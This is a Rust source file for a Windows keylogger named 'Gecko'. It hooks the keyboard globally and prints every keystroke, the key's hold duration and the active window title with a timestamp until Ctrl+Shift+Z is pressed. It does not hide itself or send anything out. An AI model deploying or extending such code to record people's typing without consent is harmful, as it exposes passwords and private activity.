use winapi::um::winuser::{GetForegroundWindow, GetWindowTextW, GetWindowTextLengthW, GetAsyncKeyState, VK_CONTROL, VK_SHIFT};
use willhook::{keyboard_hook, KeyboardKey, InputEvent};
use chrono::prelude::*;
use std::time::{Duration,Instant};
use std::collections::HashMap;

fn main() {
    let mut held_keys: HashMap<KeyboardKey, Instant> = HashMap::new();
    let h = keyboard_hook().unwrap();
    let mut last_title = String::new();
    println!("Gecko is now gathering...");

        loop {
            if exitcondition() {
                println!("Gecko will now sleep...");
                break;
            }

            let title = active_window();

            if let Ok(ie) = h.try_recv() {
                match ie {
                    InputEvent::Keyboard(ke) => {
                    if let Some(key) = ke.key {
                        handle_key_event(key, ke.pressed, &mut held_keys, &title, &mut last_title);
                    }
                }
                _ => println!("Unknown Input event: {:?}", ie),
                }
            }

            std::thread::sleep(std::time::Duration::from_millis(100));
        }
    
}

fn handle_key_event(
    key: KeyboardKey,
    pressed: willhook::KeyPress,
    held_keys: &mut HashMap<KeyboardKey, Instant>,
    title: &str,
    last_title: &mut String,
) {
    match pressed {
        willhook::KeyPress::Down(_) => {
            match held_keys.contains_key(&key){
                false => {
                    held_keys.insert(
                        key,
                        Instant::now()
                    );
                }
                _ => {}
            }
            
        }
        willhook::KeyPress::Up(_) => {
            if let Some(inittime) = held_keys.get(&key){
                let elapsed = Instant::now().duration_since(*inittime);
                if elapsed.subsec_millis() < 250 {
                    held_keys.remove(&key);
                    log_key(title.to_string(),key,Some(elapsed));
                }
            }
            else {
                log_key(title.to_string(),key,None);
            }
        }
        _ => {}
        }
    
    if title != *last_title {
        *last_title = title.to_string();
    }
}

fn log_key(
    title: String,
    key: KeyboardKey,
    elapsed: Option<Duration>
){
    let local_now = Local::now();
    let local_time_string = local_now.format("%Y-%m-%d %H:%M:%S").to_string();
    match elapsed {
        Some(hd) => {
            println!(
                "{} : {} : {:?} : Pressed and held for: {:?}",
                local_time_string, title, key, hd
            )
        },
        None => {
            println!("{} : {} : {:?} : Pressed", local_time_string, title, key)
        }
    }
}

fn active_window() -> String {
    unsafe {
        let active_window = GetForegroundWindow();
        let mut buffer: Vec<u16> = Vec::new();
        let len = GetWindowTextLengthW(active_window);
        buffer.resize((len + 1) as usize, 0); // Allocate enough space
        GetWindowTextW(active_window, buffer.as_mut_ptr(), len + 1);

        // Convert wide characters to string
        String::from_utf16_lossy(&buffer)
    }
}

fn exitcondition() -> bool {
    unsafe {
        GetAsyncKeyState(VK_CONTROL) & 0x8000u16 as i16 != 0
            && GetAsyncKeyState(VK_SHIFT) & 0x8000u16 as i16 != 0
            && GetAsyncKeyState(0x5A) & 0x8000u16 as i16 != 0
    }
}
